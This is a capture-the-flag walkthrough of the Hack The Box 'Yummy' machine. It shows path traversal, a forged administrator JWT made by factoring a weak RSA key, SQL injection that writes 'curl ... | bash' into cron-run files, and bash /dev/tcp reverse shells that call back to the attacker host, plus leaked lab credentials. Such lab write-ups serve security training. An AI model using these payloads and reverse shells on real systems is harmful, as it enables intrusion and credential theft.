![image](https://github.com/user-attachments/assets/abfb1789-0846-443a-bd89-64da26241e02)


## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 09:43 +08
Warning: 10.10.11.36 giving up on port because retransmission cap hit (10).
Nmap scan report for yummy.htb (10.10.11.36)
Host is up (0.0049s latency).
Not shown: 65147 closed tcp ports (reset), 386 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80 -sCV 10.10.11.36
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 09:44 +08
Nmap scan report for yummy.htb (10.10.11.36)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Yummy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

## 2. Exploring the web application at `80`

### 2.1. Enumerating the web application

```console
root@kali:~# gobuster dir -u http://10.10.11.36:80 -b 403,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.36:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 6893]
/register             (Status: 200) [Size: 7816]
/book                 (Status: 200) [Size: 39296]
/logout               (Status: 302) [Size: 199] [--> /login]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

### 2.2. Browsing and looking around in the web application

![image](https://github.com/user-attachments/assets/ca141cd8-2f6c-4051-9cde-dcc5a990f6b1)

![image](https://github.com/user-attachments/assets/51b237e5-48df-4bdf-bcb9-ee0476f0605a)

![image](https://github.com/user-attachments/assets/8fa606d5-68ff-493f-b28c-37863ea6d57b)

![image](https://github.com/user-attachments/assets/4a96db95-360a-4112-9be6-0067bd259c67)

![image](https://github.com/user-attachments/assets/e43bb04c-9934-48ef-9fbb-ae4128ae0163)

## 3. Webapp path traversal

### 3.1. Testing for path traversal in the "save icalendar" function

![image](https://github.com/user-attachments/assets/507d880c-9d77-4ad5-8ab9-ccee8c68bcac)

![image](https://github.com/user-attachments/assets/29366386-2b0e-462f-94ed-19c7ad0b04c7)

![image](https://github.com/user-attachments/assets/a3bed0fc-1ea9-428a-9b43-7fa010b9de12)

The path traversal works, able to read `etc/passwd`:

![image](https://github.com/user-attachments/assets/08464918-b0f0-4a46-a487-dc1141214f24)

Response header:

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=passwd
Content-Length: 2033
Content-Type: application/octet-stream
Date: Thu, 09 Jan 2025 06:04:55 GMT
Etag: "1727686952.3123646-2033-950406498"
Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
Server: Caddy
```

`/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false
```

Interesting accounts: `dev`, `qa`

### 3.2. Checking Caddy web server configuration

Nothing much useful here

![image](https://github.com/user-attachments/assets/ccbca404-72d8-49b3-adaa-ba09f451dca9)

`/etc/caddy/Caddyfile`:

```
:80 {
    @ip {
        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
    }
    redir @ip http://yummy.htb{uri}
    reverse_proxy 127.0.0.1:3000 {
    header_down -Server  
    }
}
```

### 3.3. Checking crontab

Application backup is scheduled to run `/data/scripts/app_backup.sh`

![image](https://github.com/user-attachments/assets/5a9554a9-bc1b-444f-8491-8caa5a3788bc)

`/etc/crontab`:

```sh
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

![image](https://github.com/user-attachments/assets/27cb445c-b6ea-4999-b23b-69afc500d9d9)

The application backup script just zips the entire `/opt/app` directory and saves to `/opt/app/backupapp.zip`:

`/data/scripts/app_backup.sh`:

```sh
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

### 3.4. Exploring the backup file

![image](https://github.com/user-attachments/assets/e8c11025-a6a1-4725-b56e-5e9a68e66df1)

```console
root@kali:~/opt/app# ls -l
total 32
-rw-r--r-- 1 root root 11979 Sep 25 21:54 app.py
drwxr-xr-x 3 root root  4096 Sep 30 16:16 config
drwxr-xr-x 3 root root  4096 Sep 30 16:16 middleware
drwxrwxr-x 2 root root  4096 Sep 30 16:16 __pycache__
drwxr-xr-x 6 root root  4096 Sep 30 16:16 static
drwxr-xr-x 2 root root  4096 Sep 30 16:16 templates
```

Looking for `password` in the files in this directory quickly found something:

```console
root@kali:~# grep -r password opt/app
grep: opt/app/__pycache__/app.cpython-312.pyc: binary file matches
opt/app/app.py:    'password': '3wDo7gSRZIwIHRxZ!',
opt/app/app.py:        password = request.json.get('password')
opt/app/app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
opt/app/app.py:        if not email or not password:
opt/app/app.py:            return jsonify(message="email or password is missing"), 400
opt/app/app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
opt/app/app.py:                cursor.execute(sql, (email, password2))
opt/app/app.py:                    return jsonify(message="Invalid email or password"), 401
opt/app/app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
opt/app/app.py:            if not email or not password:
opt/app/app.py:                return jsonify(error="email or password is missing"), 400
opt/app/app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
opt/app/app.py:                        cursor.execute(sql, (email, password, role_id))
grep: opt/app/config/__pycache__/signature.cpython-312.pyc: binary file matches
grep: opt/app/config/__pycache__/signature.cpython-311.pyc: binary file matches
opt/app/config/signature.py:    password=None,
opt/app/templates/login.html:                <label for="password">Password:</label>
opt/app/templates/login.html:                <input type="password" id="password" name="password">
opt/app/templates/login.html:                password: document.getElementById("password").value
opt/app/templates/register.html:                    <label for="password">Password:</label>
opt/app/templates/register.html:                    <input type="password" id="password" name="password">
opt/app/templates/register.html:                password: document.getElementById("password").value
```

#### 3.4.1. Found: database connection credentials

`opt/app/app.py`:

```py
⋮
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}
⋮
```

#### 3.4.2. Found: JWT signature generation script

`opt/app/config/signature.py`:

```py
#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
```

## 4. JWT Forgery

### 4.1. Analyze webapp JWT

Getting JWT for the test account:

![image](https://github.com/user-attachments/assets/f2ab2458-aee2-47a1-92c9-6c43e90e72f9)

Decoding test account JWT at https://jwt.io:

![image](https://github.com/user-attachments/assets/2b85420a-4a4a-4730-814e-a4e0403c74e3)

The `n` value is in the test account JWT, let's use it to forge an administrator JWT using below python script:

```py
import base64
import json
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
 
 
#enter your jwt token here
token = ""
 
 
js = json.loads(base64.b64decode( token.split(".")[1] + "===").decode())
n= int(js["jwk"]['n'])
p,q= list((sympy.factorint(n)).keys()) #divide n
e=65537
phi_n = (p-1)*(q-1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()
 
private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()
 
data = jwt.decode(token,  public_key, algorithms=["RS256"] )
data["role"] = "administrator"
 
# Create  new admin token  
new_token = jwt.encode(data, private_key, algorithm="RS256")
print(new_token)
```

### 4.2. Forging administrator JWT

```console
[root@localhost ~]# pip install PyJWT pycryptodome cryptography sympy
Collecting PyJWT
  Downloading PyJWT-2.10.1-py3-none-any.whl (22 kB)
Collecting pycryptodome
  Downloading pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
     |████████████████████████████████| 2.3 MB 14.8 MB/s
Collecting cryptography
  Downloading cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl (4.2 MB)
     |████████████████████████████████| 4.2 MB 203.1 MB/s
Collecting sympy
  Downloading sympy-1.13.3-py3-none-any.whl (6.2 MB)
     |████████████████████████████████| 6.2 MB 81.1 MB/s
Collecting cffi>=1.12
  Downloading cffi-1.17.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (445 kB)
     |████████████████████████████████| 445 kB 153.4 MB/s
Collecting mpmath<1.4,>=1.1.0
  Downloading mpmath-1.3.0-py3-none-any.whl (536 kB)
     |████████████████████████████████| 536 kB 119.0 MB/s
Collecting pycparser
  Downloading pycparser-2.22-py3-none-any.whl (117 kB)
     |████████████████████████████████| 117 kB 170.6 MB/s
Installing collected packages: pycparser, mpmath, cffi, sympy, PyJWT, pycryptodome, cryptography
Successfully installed PyJWT-2.10.1 cffi-1.17.1 cryptography-44.0.0 mpmath-1.3.0 pycparser-2.22 pycryptodome-3.21.0 sympy-1.13.3
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
[root@localhost ~]# python3 gen-token.py
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlhdCI6MTczNjQyODM5OSwiZXhwIjoxNzM2NDMxOTk5LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExNzI5MzY1NTY1MzA2NjA0MTg4MDA0NzEyNTEzNDUxMzYxOTgwMzI3MDgxMDYyNTkwODQ5NDIxNzQ5OTcxMjgxNTk1NzQxNTQ5NDAwMTYwMzE0Mjc4OTA1MDE4NTA5OTI2NjUxMTc5NTc4NDMzODAxNjY4ODg3NTczNzg2MTg1MTM4ODQ1OTIzODQ2NTMwNDI3MDc0MzAyNDA3NDU0OTQ1MDIzOTU4MTM0ODEwNDcxNTkwNTcyODI0OTk5NDM3OTY4ODA0MDczNzc5NzM5ODIyODQ2MTMxMDkyODMzNzk3NDEwNDcxMjQ5NzYyOTQwNzEyMDUwMDMyNzYyNTMwMjMzODIzMjcyNjQ2MTMzMjczNjE4NzE0NTk1MTQzOTkyNjA3NDY2MzA5MTc0NTk3NTAwNjgwODcxNzA3MSIsImUiOjY1NTM3fX0.CI_jwemFJ0CPEpVQOlVcE0TPO-N2Od5cNsrWtktKX_V5pDDob5lls53En1KXqCmsLoNf6Dw15pLeEmnaFKFLqa-UuROXBa6mPlFOdZtU9Lvjp7qM8CAUnCkOcFBm_qXdyUHSj1CofKW_AVSI79lYWuRu9pxkebJbXyY-Pw4uRPoBurA
```

Edit the token to replace it with the forged administrator token

![image](https://github.com/user-attachments/assets/66e91723-2f26-438a-a0e9-3f70794e8909)

Access to `/admindashboard` acquired:

![image](https://github.com/user-attachments/assets/c8355a42-d8aa-42ce-860d-75cca876e4cf)

## 5. SQL Injection

The `app.route` for `admindashboard` in `opt/app/app.py` show that there is no sanitization on the server input:

```py
⋮
@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))

        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
⋮
```

### 5.1. Testing for error-based SQL injection

The reservation search function uses `?s=value&o=ASC` HTTP GET parameters to perform the database query:

![image](https://github.com/user-attachments/assets/4a6a8cb3-b7fe-4c11-91b0-e576995a0bc1)

Appending a `UNION` statement to the query reveals that the webapp is susceptible to error-based SQL injection:

Query: `?s=test&o=ASC UNION SELECT 1,2,3;`

Response: `(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT 1,2,3' at line 1")`

![image](https://github.com/user-attachments/assets/e9838e5e-8806-4db9-bad1-4fdf0ee2c100)

### 5.2. Trying to retrieve user

Query: `?s=test&o=ASC;SELECT (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e)));`

Response: `(1105, "XPATH syntax error: '~chef@localhost~'")`

![image](https://github.com/user-attachments/assets/bd34c2b3-914b-49a3-8118-a5508b502531)

### 5.3. Attempt to retrieve account passwords

Identifying column names for `users` table:

Query: `?s=test&o=ASC;SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT group_concat(column_name) from information_schema.columns where table_name='users')))`

Response: `(1105, "XPATH syntax error: '\\email,id,password,role_id'")`

![image](https://github.com/user-attachments/assets/8fd4491f-9598-4c0a-9b5f-24bd444f7f7b)

Attempt to retrieve `@@secure_file_priv`

Query: `?s=test&o=ASC;SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@secure_file_priv is NULL)))`

Response: `(1105, "XPATH syntax error: '\\0'")`

![image](https://github.com/user-attachments/assets/b7b5844f-824a-40a7-bba8-519d1ac470a9)

Query: `http://yummy.htb/admindashboard?s=test&o=ASC;SELECT%20EXTRACTVALUE(1,CONCAT(0x5c,(SELECT%20@@secure_file_priv)))`

Response: `(1105, "XPATH syntax error: '\\'")`

The `secure_file_priv` is not `NULL`, but no results when trying to retrieve the value

### 5.4. Attempt to inject malicious files using `INTO OUTFILE`

#### 5.4.1. Analyze possible attack vector

Recall previously when exploring `/etc/crontab`, the `/data/scripts/dbmonitor.sh` is set to run every minute

Retrieve the script with the path traversal method previously used `GET /export/../../../../../../data/scripts/dbmonitor.sh HTTP/1.1`

```sh
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{"status": "The database is down", "time": "$timestamp"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

The script logic:
1. If MySQL service **is not active**:
  - Log `The database is down` into `dbstatus.json` and notify using `/usr/bin/mail`
  - Fix the issue by looking for the `latest_version` script and running it
2. If MySQL service **is active**:
  a. If `dbstatus.json` **exist**:
    i. If `database is down` exist in `dbstatus.json`: indicates that MySQL was previously down, but came back up, delete `dbstatus.json`
    ii. Else: the automation didn't work, fix the issue by looking for the `latest_version` script and running it
  b. If `dbstatus.json` **does not exist**: MySQL is ok → `Response is OK.`

Possible attack vector:
1. MySQL service **is active**
2. Create `dbstatus.json` with arbitrary data
3. The scheduled task should attempt to run `/data/scripts/fixer-v*`

#### 5.4.2. Get a reverse shell by leveraging the attack vector

Prepare reverse shell script in Apache:

```sh
cat << EOF > /var/www/html/rev.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.20/4444 0>&1
EOF
```

Start listener in Kali

```sh
rlwrap nc -nlvp 4444
```

Create `dbstatus.json` file:

Query: `?s=test&o=ASC;SELECT+"curl+10.10.14.20/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/dbstatus.json';`

There's no error in creating the file if it does not already exist, rerun the same query to confirm that the file is created:

![image](https://github.com/user-attachments/assets/d5db7abb-c668-4458-81e9-08b7916d372a)

Create `fixer-v___` file:

Query: `?s=test&o=ASC;SELECT+"curl+10.10.14.20/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/fixer-v___';`

There's no error in creating the file if it does not already exist, rerun the same query to confirm that the file is created:

![image](https://github.com/user-attachments/assets/8c326cf4-61e7-496e-b98e-c467b5691d41)

> [!Tip]
> 
> The Apache logs would show when the target retrieve the reverse shell script, this can be useful for troubleshooting:
> 
> ```console
> root@kali:~# tail -f /var/log/apache2/access.log
> 10.10.11.36 - - [11/Jan/2025:16:06:33 +0800] "GET /rev.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
> ```

Reverse shell hooked:

```console
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.36] 41584
bash: cannot set terminal process group (26159): Inappropriate ioctl for device
bash: no job control in this shell
mysql@yummy:/var/spool/cron$ id
id
uid=110(mysql) gid=110(mysql) groups=110(mysql)
mysql@yummy:/var/spool/cron$
```

## 6. Lateral movement to `www-data`

Recall again on `/etc/crontab`, the `app_backup.sh` is run by `www-data` every minute as well, let's get it to run a reverse shell

Prepare reverse shell script in Apache:

```sh
cat << EOF > /var/www/html/rev2.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.20/4445 0>&1
EOF
```

Start listener in Kali

```sh
rlwrap nc -nlvp 4445
```

```console
mysql@yummy:/var/spool/cron$ cd /data/scripts
cd /data/scripts
mysql@yummy:/data/scripts$ mv app_backup.sh app_backup.sh.bak
mv app_backup.sh app_backup.sh.bak
mysql@yummy:/data/scripts$ curl -sLo app_backup.sh 10.10.14.20/rev2.sh
curl -sLo app_backup.sh 10.10.14.20/rev2.sh
mysql@yummy:/data/scripts$ ls -l
ls -l
total 28
-rw-rw-r-- 1 mysql mysql   54 Jan 11 08:02 app_backup.sh
-rw-r--r-- 1 root  root    90 Sep 26 15:31 app_backup.sh.bak
-rw-r--r-- 1 root  root  1336 Sep 26 15:31 dbmonitor.sh
-rw-r----- 1 root  root    60 Jan 11 08:00 fixer-v1.0.1.sh
-rw-r--r-- 1 root  root  5570 Sep 26 15:31 sqlappointments.sql
-rw-r--r-- 1 root  root   114 Sep 26 15:31 table_cleanup.sh
```

> [!Tip]
> 
> The Apache logs would show when the target retrieve the reverse shell script, this can be useful for troubleshooting:
> 
> ```console
> root@kali:~# tail -f /var/log/apache2/access.log
> 10.10.11.36 - - [11/Jan/2025:16:06:33 +0800] "GET /rev.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
> 10.10.11.36 - - [11/Jan/2025:16:18:11 +0800] "GET /rev2.sh HTTP/1.1" 200 281 "-" "curl/8.5.0"
> ```

Reverse shell hooked:

```console
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.36] 59168
bash: cannot set terminal process group (26604): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yummy:/root$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
You have new mail in /var/mail/www-data
```

## 7. Lateral movement to `qa`

Searching for `password` in files under `www-data`'s home directory at `/var/www` reveals there may be something interesting in `/var/www/app-qatesting/.hg/store/data/app.py.i`

```console
www-data@yummy:/root$ cd ~
cd ~
www-data@yummy:~$ pwd
pwd
/var/www
www-data@yummy:~$ grep -r password .
grep -r password .
./app-qatesting/app.py:    'password': '3wDo7gSRZIwIHRxZ!',
./app-qatesting/app.py:        password = request.json.get('password')
./app-qatesting/app.py:        password2 = hashlib.sha256(password.encode()).hexdigest()
./app-qatesting/app.py:        if not email or not password:
./app-qatesting/app.py:            return jsonify(message="email or password is missing"), 400
./app-qatesting/app.py:                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
./app-qatesting/app.py:                cursor.execute(sql, (email, password2))
./app-qatesting/app.py:                    return jsonify(message="Invalid email or password"), 401
./app-qatesting/app.py:            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
./app-qatesting/app.py:            if not email or not password:
./app-qatesting/app.py:                return jsonify(error="email or password is missing"), 400
./app-qatesting/app.py:                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
./app-qatesting/app.py:                        cursor.execute(sql, (email, password, role_id))
./app-qatesting/config/signature.py:    password=None,
grep: ./app-qatesting/config/__pycache__/signature.cpython-311.pyc: binary file matches
grep: ./app-qatesting/config/__pycache__/signature.cpython-312.pyc: binary file matches
./app-qatesting/templates/register.html:                    <label for="password">Password:</label>
./app-qatesting/templates/register.html:                    <input type="password" id="password" name="password">
./app-qatesting/templates/register.html:                password: document.getElementById("password").value
./app-qatesting/templates/login.html:                <label for="password">Password:</label>
./app-qatesting/templates/login.html:                <input type="password" id="password" name="password">
./app-qatesting/templates/login.html:                password: document.getElementById("password").value
grep: ./app-qatesting/.hg/wcache/checkisexec: Permission denied
grep: ./app-qatesting/.hg/store/data/app.py.i: binary file matches
```

Credentials found: `qa` / `jPAd!XQCtn8Oc@2B`

```console
www-data@yummy:~$ cat ./app-qatesting/.hg/store/data/app.py.i
cat ./app-qatesting/.hg/store/data/app.py.i
        �!_��������qn�l��*��!�E�K�0v�K(�/�`_ MOj_ +�=L�3R�␦�Zk�
��QL���{2�d\WQP] ���d��|(^����7�o�h�忩[���U[��=���!�~�33��R"�,�.Ah�z�x�����R�_�Y֓nS��s�Ч����
                                                                                            C�S������Z:L*"��}Z�ַ��&�_�
                                                                                                                      e��4�I�ևz�^x�U�~$$�{pn��3F9]�"�lG��#o�0�6�(rN[9��N��|��oGf�[I���z��+=q�@����Mj�Bpڊ�}��x{R��c��O��Q��[U�(�0����i��`ɤ"B�DL$Pb2a��AV�����σ��f��Y���8���eO>�qZ+�G�?�+�Ũ��[~�$y6��0�<2�5�P��ښD$,L���,"p�<�LD$
                                                           ��k+�rv��G�R�d�j�A��B[�T�yغtm�>]*+E5�GM{b�W�����pD%۪^,&9�5���~�:��sX��N�����0�
Uj�dx��2gU����[��T�p{cI��D�v�S�TH��""����v;;IQy_f��ֺ��
                                                      ���
                                                         Z����Y.���}�]�V�V�뜳��
D9����Ook2`��BĀ
               �������n�c�����b�I���h67�e��x����x<
                                                  <n���E�#���e�ZR��
                                                                   I�iZ ��Z,U�4M�,␦f��_���$2�A��>=�_␦2��)S�w�
�@��}ޣk�c��p�h�Q�>��S���O#qP8&8`tL�ȧ�и�;Y畝<��{s{���a��惜-�?�+��Q-���T�G��<X�X�1*k��cc�w��fC�!tÆC*0T�:e�*�
                                   G� {�E��[[=�2�m�Bl�)�        (ea�%��`�(I� �
                                                                              C�� B@��!��⇯��ǚ��tVd���L��y=��I���X�Rm������7dp���a`�-��!�E=Y-;���Fv�F�M[
                                                                                                                                                       �p�n�� "Ѻ�R��Ҟ␦��ƣ� �9�Ko␦�<0e�,�$�|%��2��� F�]@��lOi��v7>�����Cz���@�XB����ﷃb[�]w_϶�ۗ��^���`d30�BD��6�$����x�5
                                                      f�Z#=��$��\]x��i�>�ri��V��I����␦��        .��̆��������Ͼ(�u��V�m���<V����i�����p�7:C)c�|�ßU���Pg�B�Qi�!�p[+��E�����M�}v␦Z�i����ÏN��o.65��_���ȅd
��+?�8��51����$T���#b�TU��G;<*␦mu�_�CA�q��-��ʫ��7�%!�X���"�:�ѡ�UK���n2�f�������3���L�?�:�T�����T�)`��/.��D��
                                                                                                            t��w��n�V����2��q�C�|(��^}�*�F�z�r�䣸,=11)CJ}��D�nVE}���`�\���4�9óv�A�A�W��%�JN���·"���*���g�n�G�␦�������qZ,ᨚ��F�'.G����<3�ZP]N�6���qT�\�!>�K\_��<�M�+�x�␦��N���1D
M�4���p~%+!�2�M�S�H�چ7����8�    r6p�0���T+Z`[(_��樬�Z�3�
                     V��2
D�~e�FC0���9C�lN������Z�y���j�5����њph��v8�     ��
���x�L��ŵb6fX��l~÷�Ѩx�R��`xlS�����                ��zȜa:��MlM���!�
                                  �dחFl�ћ���D�1���R[#���*�a�t�kգ�?,\����0G'W�#T�a��8����}T�Q��6�ϛ�3�y�*�xǅV     ���C/��6��L�6_�
